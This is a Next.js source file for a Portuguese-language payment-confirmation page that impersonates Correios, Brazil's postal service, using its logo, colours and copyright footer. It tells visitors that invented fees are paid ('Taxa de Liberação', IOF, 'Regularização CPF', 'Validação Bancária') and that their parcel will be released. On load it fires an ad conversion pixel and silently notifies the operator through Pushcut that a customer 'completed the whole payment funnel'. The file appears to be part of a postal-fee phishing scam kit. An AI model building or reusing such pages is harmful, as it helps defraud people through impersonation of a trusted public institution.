"use client"

import { useEffect } from "react"
import { CheckCircle2, Package, Truck } from "lucide-react"
import Image from "next/image"

declare global {
  interface Window {
    gtag?: (...args: unknown[]) => void
  }
}

export default function ObrigadoPage() {
  useEffect(() => {
    // Pixel de conversão - Validação paga
    if (typeof window !== "undefined" && window.gtag) {
      window.gtag("event", "conversion", {
        send_to: "AW-18028225318/FtN3CJa12owcEKbGw5RD",
        transaction_id: Date.now().toString(),
      })
    }

    // Notificação Pushcut - Venda completa
    fetch("https://api.pushcut.io/EAdPHzz_Giwpjt0AwH9L_/notifications/Correios%20", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        title: "Venda Completa - Correios",
        text: "Um cliente completou todo o funil de pagamento!",
      }),
    }).catch(() => {
      // Silent fail
    })
  }, [])

  return (
    <div className="min-h-screen bg-gray-100">
      {/* Header Correios */}
      <header className="bg-[#004069]">
        <div className="max-w-6xl mx-auto px-4 py-3">
          <Image
            src="/images/correios-logo.png"
            alt="Correios"
            width={150}
            height={40}
            className="h-10 w-auto brightness-0 invert"
          />
        </div>
      </header>

      <main className="max-w-2xl mx-auto px-4 py-12">
        <div className="bg-white rounded-lg shadow-lg overflow-hidden">
          {/* Success Banner */}
          <div className="bg-green-500 p-8 text-center">
            <div className="bg-white rounded-full p-4 w-24 h-24 mx-auto mb-4 flex items-center justify-center">
              <CheckCircle2 className="w-16 h-16 text-green-500" />
            </div>
            <h1 className="text-3xl font-bold text-white mb-2">
              Pagamento Confirmado!
            </h1>
            <p className="text-green-100 text-lg">
              Todas as taxas foram quitadas com sucesso
            </p>
          </div>

          {/* Content */}
          <div className="p-8">
            <div className="bg-blue-50 border-l-4 border-blue-500 p-6 mb-6">
              <h2 className="text-xl font-bold text-blue-800 mb-3 flex items-center gap-2">
                <Package className="w-6 h-6" />
                Sua encomenda será liberada
              </h2>
              <p className="text-blue-700">
                Todos os pagamentos foram processados com sucesso. Sua encomenda será liberada para entrega em até 48 horas úteis.
              </p>
            </div>

            <div className="space-y-4 mb-8">
              <div className="flex items-center gap-3 p-4 bg-gray-50 rounded-lg">
                <div className="bg-green-100 p-2 rounded-full">
                  <CheckCircle2 className="w-5 h-5 text-green-600" />
                </div>
                <div>
                  <p className="font-semibold text-gray-800">Taxa de Liberação</p>
                  <p className="text-sm text-gray-600">Pago com sucesso</p>
                </div>
              </div>

              <div className="flex items-center gap-3 p-4 bg-gray-50 rounded-lg">
                <div className="bg-green-100 p-2 rounded-full">
                  <CheckCircle2 className="w-5 h-5 text-green-600" />
                </div>
                <div>
                  <p className="font-semibold text-gray-800">IOF - Imposto sobre Operações</p>
                  <p className="text-sm text-gray-600">Pago com sucesso</p>
                </div>
              </div>

              <div className="flex items-center gap-3 p-4 bg-gray-50 rounded-lg">
                <div className="bg-green-100 p-2 rounded-full">
                  <CheckCircle2 className="w-5 h-5 text-green-600" />
                </div>
                <div>
                  <p className="font-semibold text-gray-800">Regularização CPF</p>
                  <p className="text-sm text-gray-600">Pago com sucesso</p>
                </div>
              </div>

              <div className="flex items-center gap-3 p-4 bg-gray-50 rounded-lg">
                <div className="bg-green-100 p-2 rounded-full">
                  <CheckCircle2 className="w-5 h-5 text-green-600" />
                </div>
                <div>
                  <p className="font-semibold text-gray-800">Validação Bancária</p>
                  <p className="text-sm text-gray-600">Pago com sucesso</p>
                </div>
              </div>
            </div>

            <div className="bg-yellow-50 border border-yellow-200 p-6 rounded-lg mb-6">
              <div className="flex items-start gap-3">
                <Truck className="w-6 h-6 text-yellow-600 flex-shrink-0 mt-1" />
                <div>
                  <h3 className="font-bold text-yellow-800 mb-1">Próximos Passos</h3>
                  <p className="text-yellow-700 text-sm">
                    Você receberá um e-mail com o código de rastreamento atualizado assim que sua encomenda for despachada. Acompanhe o status pelo site dos Correios.
                  </p>
                </div>
              </div>
            </div>

            <a
              href="/"
              className="block w-full bg-[#004069] hover:bg-[#003050] text-white font-bold py-4 px-8 text-center rounded-lg transition-colors"
            >
              Voltar para o Início
            </a>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#004069] text-white py-6 mt-12">
        <div className="max-w-6xl mx-auto px-4 text-center">
          <p className="text-sm text-blue-200">
            © 2024 Correios - Empresa Brasileira de Correios e Telégrafos
          </p>
        </div>
      </footer>
    </div>
  )
}
